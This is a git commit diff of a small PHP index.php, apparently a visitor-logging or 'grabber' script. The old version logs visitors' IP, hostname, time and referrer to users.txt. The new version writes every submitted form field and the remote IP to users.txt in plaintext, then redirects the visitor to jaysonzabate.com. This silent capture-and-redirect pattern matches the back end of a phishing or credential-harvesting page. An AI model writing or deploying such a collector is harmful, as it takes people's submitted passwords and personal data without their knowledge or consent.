b1822a7cdfc5fcae78ae6e8d2fcad42fc83b58a4
Jayson Zabate <asdjsonyou@users.noreply.github.com>
2015-02-19 04:46:28 -0800

    Update index.php

--- index.php
+++ index.php
@@ -1,49 +1,14 @@
 <?php
+ // writing Ip address to the same file
+$handle = fopen('users.txt', 'a');
 
-  $ip = $_SERVER['REMOTE_ADDR']; // Grabbing the IP
-  $time = date("l F dS h:i A Y"); // Logging the time and date
-  $hostaddress = gethostbyaddr($ip); // Host name
-  $browser = $_SERVER['HTTP_USER_AGENT']; // needs work
-  $referred = $_SERVER['HTTP_REFERER']; // referrer
+foreach($_POST as $variable => $value) {
+    fwrite($handle, $variable . '=' . $value . PHP_EOL);
+}
 
-           //Writing the time and date to a file
+fwrite($handle, 'REMOTE IP ADDRESS: ' . $_SERVER['REMOTE_ADDR'] . PHP_EOL); // Grabbing the REMOTE IP ADDRESS
+fclose($handle);
 
-  $myFile = "users.txt";
-  $fh = fopen($myFile, 'a') or die("can't open file");
-  $stringData = "$time\n  ";
-  fwrite($fh, $stringData);
-  fclose($fh);
-
-          // writing Ip address to the same file
-
-  $myFile = "users.txt"; // value 1
-  $fh = fopen($myFile, 'a') or die("can't open file");
-  $stringData = "$ip\n  ";
-  fwrite($fh, $stringData);
-  fclose($fh);
-
-          // also writing hostname to the same file
-
-  $myFile = "users.txt"; // value 2
-  $fh = fopen($myFile, 'a') or die("can't open file");
-  $stringData = "$hostaddress\n  ";
-  fwrite($fh, $stringData);
-  fclose($fh);
-  print "<strong> </strong><br/>\n";
-
-           if ($referred == "")
-              {
-                print "";
-               
-              }else{
-
-	             print "$referred";
-              }
-   ?>
-
-<!-- Redirectng to a different page (this is optional just delete this javascript if u dont want to redirect) -->
-
-<script type="text/javascript">
-   window.location = "http://jaysonzabate.com/"
-</script>
-  
+/* Redirectng to a different page --> */
+header('Location: http://jaysonzabate.com/');
+exit;
